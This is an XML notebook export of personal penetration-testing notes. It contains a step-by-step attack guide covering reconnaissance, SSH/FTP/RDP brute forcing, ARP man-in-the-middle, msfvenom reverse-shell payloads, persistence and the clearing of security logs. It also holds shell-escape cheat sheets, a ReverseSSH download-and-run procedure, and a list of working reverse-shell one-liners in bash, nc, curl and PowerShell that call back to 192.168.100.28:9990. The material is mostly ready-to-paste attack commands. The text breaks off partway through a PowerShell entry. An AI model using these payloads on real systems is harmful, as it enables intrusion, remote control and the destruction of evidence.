        <node name="nmapsi4" unique_id="287" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696639005" ts_lastsave="1696639005"/>
        <node name="nmcli" unique_id="184" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285801" ts_lastsave="1684285801"/>
        <node name="nslookup" unique_id="208" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286166" ts_lastsave="1684286180"/>
        <node name="owasp" unique_id="180" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285767" ts_lastsave="1684285772"/>
        <node name="patator" unique_id="195" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285961" ts_lastsave="1684285975"/>
        <node name="ping" unique_id="210" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286201" ts_lastsave="1684286205"/>
        <node name="proxychains" unique_id="200" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286022" ts_lastsave="1684286027"/>
        <node name="python" unique_id="243" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685336868" ts_lastsave="1728545859">
          <rich_text>python -c ‘from time import time as t;print(t())’</rich_text>
        </node>
        <node name="route" unique_id="190" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285872" ts_lastsave="1684285877"/>
        <node name="searchsploit" unique_id="193" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285904" ts_lastsave="1684287412">
          <rich_text>searchsploit xxx
searchsploit -p 0000
gcc -o openfuck OpenFuck.c -lcrypto</rich_text>
        </node>
        <node name="smbclient" unique_id="227" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287313" ts_lastsave="1684287313"/>
        <node name="sqlmap" unique_id="240" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684529801" ts_lastsave="1684529801"/>
        <node name="traceroute" unique_id="212" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286212" ts_lastsave="1684286212"/>
        <node name="wapiti" unique_id="237" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684529739" ts_lastsave="1684529739"/>
        <node name="whatweb" unique_id="352" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725161979" ts_lastsave="1725161979"/>
        <node name="whois" unique_id="201" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286071" ts_lastsave="1718594701"/>
      </node>
      <node name="HowTo" unique_id="407" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730247020" ts_lastsave="1730249943">
        <rich_text scale="h1" foreground="#8f8ff0f0a4a4" weight="heavy">HowTo: Comprehensive Penetration Testing Guide</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">1. Target Identification</rich_text>
        <rich_text>
• Goal: Determine the IP address or domain name of the target.
• Tools: nslookup, ping, whois, dig, traceroute
</rich_text>
        <rich_text family="monospace">nslookup targetdomain.com                        # Domain to IP resolution
ping targetdomain.com                            # Checks connectivity and IP
whois targetdomain.com                           # Retrieves domain info
dig targetdomain.com                             # DNS information
traceroute targetdomain.com                      # Shows route to target</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">2. Port and Service Scanning</rich_text>
        <rich_text>
• Goal: Identify open ports and active services on the target.
• Tools: nmap, masscan, RustScan, Unicornscan, Zenmap
</rich_text>
        <rich_text family="monospace">nmap -sV -p- targetIP                            # Full port scan with service detection
masscan -p80,443,22 targetIP --rate=1000        # Quick scan on specified ports
RustScan -a targetIP                             # Fast scanner that works with nmap
Unicornscan -msf targetIP                        # Quick service discovery
Zenmap                                          # GUI-based nmap for visual exploration</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">3. System and OS Information Gathering</rich_text>
        <rich_text>
• Goal: Identify the OS, versions, and configurations of the target.
• Tools: nmap, netcat, telnet, p0f, xprobe2
</rich_text>
        <rich_text family="monospace">nmap -O targetIP                                 # OS fingerprinting
nc targetIP 80                                   # Banner grabbing on HTTP
telnet targetIP 80                               # Banner grabbing via telnet
p0f -i eth0                                      # Passive OS fingerprinting
xprobe2 -v -p tcp -T0 targetIP                   # OS detection with specific protocols</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">4. Create a Wordlist for the Target</rich_text>
        <rich_text>
• Goal: Generate custom wordlists for brute-forcing passwords, paths, or usernames.
• Tools: CeWL, crunch, wordlists, john, hashcat
</rich_text>
        <rich_text family="monospace">cewl http://targetdomain.com -w wordlist.txt      # Custom wordlist from website
crunch 8 8 abcdef123 &gt; wordlist.txt               # Wordlist with specified characters
cat /usr/share/wordlists/rockyou.txt &gt; wordlist.txt  # RockYou wordlist for passwords
john --wordlist=/path/to/wordlist.txt --rules     # Generate variants using John the Ripper
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt  # Hashcat wordlist mod</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">5. Set a Local Domain for the Target</rich_text>
        <rich_text>
• Goal: Configure a local DNS for direct target access and testing.
• Tools: nano, /etc/hosts, dnsmasq, BIND9, PowerDNS
</rich_text>
        <rich_text family="monospace">sudo nano /etc/hosts                              # Add target IP and domain
sudo service dnsmasq restart                      # Restart local DNS server</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">6. Subdomain Discovery</rich_text>
        <rich_text>
• Goal: Find additional subdomains with unique services or vulnerabilities.
• Tools: sublist3r, amass, subfinder, Assetfinder, dnsenum
</rich_text>
        <rich_text family="monospace">sublist3r -d targetdomain.com                     # Enumerate subdomains
amass enum -d targetdomain.com                    # Amass enumeration
subfinder -d targetdomain.com                     # Fast subdomain discovery
assetfinder --subs-only targetdomain.com          # Another tool for subdomains
dnsenum targetdomain.com                          # DNS enumeration for subdomains
nslookup targetdomain.com                         # Check local DNS entry</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">7. Web Content Scanning</rich_text>
        <rich_text>
• Goal: Map accessible files, directories, and hidden web content.
• Tools: gobuster, dirbuster, dirb, feroxbuster, ffuf
</rich_text>
        <rich_text family="monospace">gobuster dir -u http://targetdomain.com -w /usr/share/wordlists/dirb/common.txt
dirbuster                                         # GUI-based brute-force tool
dirb http://targetdomain.com                       # Command-line web scanning
feroxbuster -u http://targetdomain.com -w /path/to/wordlist.txt  # Recursively searches dirs
ffuf -w /path/to/wordlist.txt -u http://targetdomain.com/FUZZ    # Fast content discovery</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">8. Enumerate User Accounts and Groups</rich_text>
        <rich_text>
• Goal: Identify target’s users, groups, and permissions.
• Tools: enum4linux, rpcclient, smbclient, nbtscan, CrackMapExec
</rich_text>
        <rich_text family="monospace">enum4linux -a targetIP                            # Enumerate SMB shares, users
rpcclient -U "" -N targetIP                       # Connects to SMB for user data
smbclient -L \\targetIP -N                        # Lists SMB shares without authentication
nbtscan -r targetIP                               # NetBIOS information
crackmapexec smb targetIP -u user -p password     # SMB enumeration and login testing</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">9. Identify Vulnerabilities</rich_text>
        <rich_text>
• Goal: Detect known vulnerabilities in services and applications.
• Tools: nmap (vulners), OpenVAS, Nessus, Nikto, searchsploit
</rich_text>
        <rich_text family="monospace">nmap --script vuln targetIP                       # Vulnerability scan with nmap
openvas --start                                   # Starts OpenVAS scanner
nessus -q                                         # Nessus CLI for vulnerability scanning
nikto -h http://targetdomain.com                  # Web vulnerability scanner
searchsploit targetService targetVersion          # Search exploits for specific services</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">10. Brute Force Services</rich_text>
        <rich_text>
• Goal: Attempt login access by brute-forcing passwords for services.
• Tools: Hydra, Medusa, Patator, THC-Hydra, Crowbar
</rich_text>
        <rich_text family="monospace">hydra -l admin -P wordlist.txt ssh://targetIP      # SSH brute force
medusa -h targetIP -U users.txt -P passwords.txt -M ssh  # Brute-forcing via Medusa
patator ssh_login host=targetIP user=admin password=FILE0 0=wordlist.txt  # Patator brute force
thc-hydra -l admin -P /path/to/wordlist.txt ftp://targetIP  # FTP brute force
crowbar -b rdp -s targetIP -u admin -C wordlist.txt # RDP brute force</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">11. Intercept and Analyze Network Traffic</rich_text>
        <rich_text>
• Goal: Capture and inspect network traffic for potential sensitive data.
• Tools: Wireshark, tcpdump, ettercap, dsniff, tshark
</rich_text>
        <rich_text family="monospace">tcpdump -i eth0 -w capture.pcap                   # Capture packets
wireshark capture.pcap                            # Inspect packets in Wireshark
ettercap -T -M arp:remote -i eth0 // //           # Man-in-the-middle (MITM) attacks
dsniff -i eth0                                    # Sniff passwords in network traffic
tshark -r capture.pcap                            # Command-line packet analysis</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3" weight="heavy">12. Exploit Identified Vulnerabilities</rich_text>
        <rich_text>
• Goal: Use exploits to gain unauthorized access.
• Tools: Metasploit, searchsploit, exploit-db, Impacket, Exploit-DB CLI
</rich_text>
        <rich_text family="monospace">msfconsole                                         # Opens Metasploit console
searchsploit targetService targetVersion           # Locate exploit scripts
python3 /path/to/impacket/examples/psexec.py      # Impacket exploitation tool
exploit-db --search "service/version"              # Exploit-DB CLI search
msfvenom -p windows/shell_reverse_tcp LHOST=attackerIP LPORT=4444 -f exe -o exploit.exe # Generate payload</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">13. Maintain Access</rich_text>
        <rich_text>
• Goal: Set up a persistent backdoor for continued access.
• Tools: Metasploit (persistence modules), netcat, ssh, Empire, Meterpreter
</rich_text>
        <rich_text family="monospace">nc -lvp 4444                                      # Persistent netcat listener
msfconsole                                        # Metasploit persistence modules
ssh user@targetIP -fN -R 4444:localhost:22        # SSH reverse tunnel
Empire                                           # PowerShell post-exploitation framework
use exploit/multi/handler                         # Use Metasploit for shell persistence</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">14. Clean Up and Remove Traces</rich_text>
        <rich_text>
• Goal: Erase any evidence of testing to prevent detection.
• Tools: shred, secure-delete, BleachBit, auditpol, logrotate
</rich_text>
        <rich_text family="monospace">shred -u sensitive_file                            # Securely delete a file
secure-delete -r /path/to/file_or_directory        # Deletes files irrecoverably
bleachbit --clean                                 # Clean logs and other traces
auditpol /clear                                   # Clear security event logs
logrotate -f /etc/logrotate.conf                  # Force log rotation to remove old logs</rich_text>
        <rich_text>
</rich_text>
      </node>
    </node>
    <node name="Spawn shell" unique_id="295" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1718592943" ts_lastsave="1729650284">
      <rich_text scale="h1" weight="heavy">Full TTY Spawning Shell</rich_text>
      <rich_text>
(Quick Guide)

# </rich_text>
      <rich_text foreground="#f6f661615151" weight="heavy">Tip</rich_text>
      <rich_text>: For not saving commands, start with a space (" ") in the first of commands -&gt; (' echo' instead ‘echo’)


Script:
# Trick: Dont save nothing
</rich_text>
      <rich_text family="monospace">script -qc /bin/bash /dev/null</rich_text>
      <rich_text>
</rich_text>
      <rich_text family="monospace">script -qc /bin/sh /dev/null</rich_text>
      <rich_text>

Python:
</rich_text>
      <rich_text family="monospace">python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

</rich_text>
      <rich_text>bash/sh:</rich_text>
      <rich_text family="monospace">
/bin/bash -i
/bin/sh -i


</rich_text>
      <rich_text>Set $TERM (Environment):</rich_text>
      <rich_text family="monospace">
export TERM=screen
export TERM=xterm
</rich_text>
      <rich_text>
Set $SHELL:</rich_text>
      <rich_text family="monospace">
export SHELL=/bin/bash
export SHELL=/bin/sh
</rich_text>
      <rich_text>
set $PATH:
</rich_text>
      <rich_text family="monospace">PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/snap/bin:/snap/sbin</rich_text>
      <rich_text>

Update $PATH:
</rich_text>
      <rich_text family="monospace">PATH=$PAHT:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/snap/bin:/snap/sbin</rich_text>
      <rich_text>


quick alias:
</rich_text>
      <rich_text family="monospace">alias ls='ls --color'
alias ll='ls -al --color'
alias c='clear'</rich_text>
      <rich_text>
</rich_text>
      <rich_text family="monospace">alias srv='service --status-all'
alias srx='service --status-all | grep "+"'</rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2" weight="heavy">Source:</rich_text>
      <rich_text>
</rich_text>
      <rich_text link="webs https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys">https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys</rich_text>
      <rich_text>
</rich_text>
      <rich_text link="webs https://hideandsec.sh/books/cheatsheets-82c/page/spawning-tty-shells">https://hideandsec.sh/books/cheatsheets-82c/page/spawning-tty-shells</rich_text>
      <rich_text>


</rich_text>
      <rich_text scale="h2" weight="heavy">All-In-One</rich_text>
      <rich_text>(each line start with a space)</rich_text>
      <rich_text scale="h2">:</rich_text>
      <rich_text>
</rich_text>
      <rich_text foreground="#8f8ff0f0a4a4"> script -qc /bin/bash /dev/null;
 python -c 'import pty; pty.spawn("/bin/bash")'
 PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/snap/bin:/snap/sbin;
 export TERM=screen;
 export SHELL=/bin/bash;</rich_text>
      <rich_text>
 
</rich_text>
      <node name="book.hacktricks.xyz" unique_id="298" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718593266" ts_lastsave="1718595909">
        <rich_text scale="h2" weight="heavy">From The </rich_text>
        <rich_text link="webs https://book.hacktricks.xyz" scale="h2">https://book.hacktricks.xyz</rich_text>
        <rich_text>
visit for more info</rich_text>
        <node name="Full TTY" unique_id="299" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718593331" ts_lastsave="1728097547">
          <rich_text scale="h2" weight="heavy">python</rich_text>
          <rich_text>
• </rich_text>
          <rich_text family="monospace">python3 -c 'import pty; pty.spawn("/bin/bash")'

</rich_text>
          <rich_text family="monospace" foreground="#ffffffffffff">(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2" weight="heavy">script</rich_text>
          <rich_text> (not store anything)
• </rich_text>
          <rich_text family="monospace">script /dev/null -qc /bin/bash #/dev/null

</rich_text>
          <rich_text family="monospace" foreground="#ffffffffffff">(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2" weight="heavy">socat</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</rich_text>
        </node>
        <node name="NoTTY" unique_id="302" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718594579" ts_lastsave="1718594580">
          <rich_text scale="h2">No TTY
</rich_text>
          <rich_text>
If for some reason you cannot obtain a full TTY you </rich_text>
          <rich_text weight="heavy">still can interact with programs</rich_text>
          <rich_text> that expect user input. In the following example, the password is passed to </rich_text>
          <rich_text family="monospace">sudo</rich_text>
          <rich_text> to read a file:

</rich_text>
          <rich_text family="monospace">expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "&lt;THE_PASSWORD_OF_THE_USER&gt;";send "\r\n";interact'</rich_text>
        </node>
        <node name="ReverseSSH" unique_id="301" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718594306" ts_lastsave="1718594551">
          <rich_text>☐ Prepare locally to catch the ssh port forwarding request:

</rich_text>
          <rich_text family="monospace"># Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh &amp;&amp; chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444</rich_text>
          <rich_text> 

Linux target:
</rich_text>
          <rich_text family="monospace"># Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh &amp;&amp; chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2</rich_text>
          <rich_text>

Windows 10 target (for earlier versions, check </rich_text>
          <rich_text link="webs https://github.com/Fahrj/reverse-ssh#features">project readme</rich_text>
          <rich_text>):
</rich_text>
          <rich_text family="monospace"># Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2</rich_text>
          <rich_text>

☐ If the ReverseSSH port forwarding request was successful, you should now be able to log in with the default password </rich_text>
          <rich_text family="monospace">letmeinbrudipls</rich_text>
          <rich_text> in the context of the user running </rich_text>
          <rich_text family="monospace">reverse-ssh(.exe)</rich_text>
          <rich_text>:

</rich_text>
          <rich_text family="monospace"># Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="Spawn shells" unique_id="300" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718594101" ts_lastsave="1728100100">
          <rich_text>
</rich_text>
          <rich_text scale="h3" weight="heavy">Spawn shells</rich_text>
          <rich_text>

</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4">python</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">python -c 'import pty; pty.spawn("/bin/bash")'</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4">python</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">python -c 'import pty; pty.spawn("/bin/sh")'</rich_text>
          <rich_text>


</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4">bash</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">/bin/bash -i</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4">bin</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">/bin/sh -i</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4">script</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">script -qc /bin/bash /dev/null</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4">script</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">script -qc /bin/sh /dev/null</rich_text>
          <rich_text>

</rich_text>
          <rich_text foreground="#f6f661615151">echo</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">echo os.system('/bin/bash')</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f6f661615151">echo</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">echo os.system('/bin/sh')</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text foreground="#ffffa3a34848">perl</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">perl -e 'exec "/bin/bash";'</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#ffffa3a34848">perl</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">perl -e 'exec "/bin/sh";'</rich_text>
          <rich_text>

</rich_text>
          <rich_text foreground="#ffffa3a34848">perl</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">exec "/bin/bash";</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#ffffa3a34848">perl</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">exec "/bin/sh";</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text foreground="#ffffa3a34848">ruby</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">exec "/bin/bash"</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#ffffa3a34848">ruby</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">exec "/bin/sh"</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text foreground="#f6f661615151">lua</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">os.execute('/bin/bash')</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#ffffa3a34848">lua</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">os.execute('/bin/sh')</rich_text>
          <rich_text>

</rich_text>
          <rich_text foreground="#ffffa3a34848">IRB</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">exec "/bin/bash"</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#ffffa3a34848">IRB</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">exec "/bin/sh"</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text foreground="#f6f661615151">vi</rich_text>
          <rich_text>:		</rich_text>
          <rich_text family="monospace">:!bash</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f6f661615151">vi</rich_text>
          <rich_text>:		</rich_text>
          <rich_text family="monospace">:!sh</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text foreground="#f6f661615151">vi</rich_text>
          <rich_text>:		</rich_text>
          <rich_text family="monospace">:set shell=/bin/bash:shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f6f661615151">vi</rich_text>
          <rich_text>:		</rich_text>
          <rich_text family="monospace">:set shell=/bin/sh:shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text foreground="#f6f661615151">nmap</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">!bash</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f6f661615151">nmap</rich_text>
          <rich_text>:	</rich_text>
          <rich_text family="monospace">!sh</rich_text>
          <rich_text>



</rich_text>
        </node>
      </node>
      <node name="netsec" unique_id="297" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718593011" ts_lastsave="1718595071">
        <rich_text>python: </rich_text>
        <rich_text family="monospace">python -c 'import pty; pty.spawn("/bin/sh")'

</rich_text>
        <rich_text>echo: </rich_text>
        <rich_text family="monospace">echo os.system('/bin/bash')
</rich_text>
        <rich_text>
sh: </rich_text>
        <rich_text family="monospace">/bin/sh -i</rich_text>
        <rich_text>

bash: </rich_text>
        <rich_text family="monospace">/bin/bash -i
</rich_text>
        <rich_text>
perl: </rich_text>
        <rich_text family="monospace">perl -e 'exec "/bin/sh";'

</rich_text>
        <rich_text>IRB: </rich_text>
        <rich_text family="monospace">exec "/bin/sh"</rich_text>
        <rich_text>

lua: </rich_text>
        <rich_text family="monospace">os.execute('/bin/sh')</rich_text>
        <rich_text>

nmap: </rich_text>
        <rich_text family="monospace">!sh</rich_text>
        <rich_text>

VI
</rich_text>
        <rich_text family="monospace">:!bash
:set shell=/bin/bash:shell
</rich_text>
      </node>
      <node name="revshells.com" unique_id="356" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725519413" ts_lastsave="1728356486">
        <rich_text underline="single" scale="h1" weight="heavy">Reverse Shell Generator</rich_text>
        <rich_text underline="single" weight="heavy">
</rich_text>
        <rich_text weight="heavy">

W</rich_text>
        <rich_text scale="h2" weight="heavy">ebsite:</rich_text>
        <rich_text>
</rich_text>
        <rich_text link="webs https://www.revshells.com/" foreground="#1c1c7171d8d8">https://www.revshells.com/</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2" weight="heavy">Github:</rich_text>
        <rich_text>
</rich_text>
        <rich_text link="webs https://github.com/0dayCTF/reverse-shell-generator">https://github.com/0dayCTF/reverse-shell-generator</rich_text>
        <node name="sample" unique_id="357" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725519471" ts_lastsave="1725521034">
          <rich_text underline="single" scale="h1" weight="heavy">Reverse Shell Online</rich_text>
          <rich_text scale="h1" weight="heavy">: </rich_text>
          <rich_text scale="h1" foreground="#1c1c7171d8d8" weight="heavy">https://www.revshells.com/</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h1" weight="heavy">info</rich_text>
          <rich_text>
192.168.100.28
9990


</rich_text>
          <rich_text scale="h1" weight="heavy">Listener</rich_text>
          <rich_text>
• 		nc -lvnp 9990 
• 		busybox nc -lp 9990
• 		openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port 9990
• 		msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.100.28; set lport 9990; exploit"

    
  
</rich_text>
          <rich_text scale="h1" weight="heavy">Reverse</rich_text>
          <rich_text weight="heavy">
Bash -i</rich_text>
          <rich_text>
sh -i &gt;&amp; /dev/tcp/192.168.100.28/9990 0&gt;&amp;1

</rich_text>
          <rich_text weight="heavy">nc -e</rich_text>
          <rich_text>
nc 192.168.100.28 9990 -e sh
nc.exe 192.168.100.28 9990 -e sh

</rich_text>
          <rich_text weight="heavy">BusyBox nc -e</rich_text>
          <rich_text>
busybox nc 192.168.100.28 9990 -e sh

</rich_text>
          <rich_text weight="heavy">curl</rich_text>
          <rich_text>
C='curl -Ns telnet://192.168.100.28:9990'; $C &lt;/dev/null 2&gt;&amp;1 | sh 2&gt;&amp;1 | $C &gt;/dev/null/

</rich_text>
          <rich_text weight="heavy">powershell #1</rich_text>
          <rich_text>
$LHOST = "192.168.100.28"; $LPORT = 9990; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2&gt;&amp;1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

</rich_text>
          <rich_text weight="heavy">powershell #2</rich_text>
          <rich_text>
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.100.28',9990);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

</rich_text>
          <rich_text weight="heavy">powershell #3</rich_text>
          <rich_text>
